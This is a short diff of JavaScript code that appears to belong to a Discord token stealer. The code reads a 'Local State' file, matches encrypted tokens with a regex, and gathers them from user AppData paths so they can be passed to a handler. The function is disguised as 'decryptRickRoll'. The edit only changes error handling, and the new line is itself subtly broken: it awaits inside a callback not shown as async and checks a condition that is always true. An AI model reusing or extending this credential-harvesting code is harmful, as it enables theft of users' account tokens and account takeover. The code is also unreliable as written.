@@ -29,7 +29,7 @@ const encryptedTokenRegex = /dQw4w9WgXcQ:[^.*['(.*)'\].*$][^"]*/gi;
 const tokensNotWorking = join(getTempFolder(), generateString(10) + '.tmp');
 
 const decryptRickRoll = (path) => {
-  return new Promise((resolve, reject) => {
+  return new Promise((resolve) => {
     const encryptedTokens = [];
     const localStatePath = join(path, 'Local State');
     if (!existsSync(localStatePath)) return;
@@ -60,11 +60,7 @@ const decryptRickRoll = (path) => {
           source: path.replace(process.env.LOCALAPPDATA, '').replace(process.env.APPDATA, '').replace('User Data', '').split('\\').join(' ').trim()
         });
       }
-      if (tokens.length <= 0) {
-        reject();
-      } else {
-        handleTokens(tokens, resolve);
-      }
+      if (tokens.length >= 0) await handleTokens(tokens, resolve);
     });
   });
 };
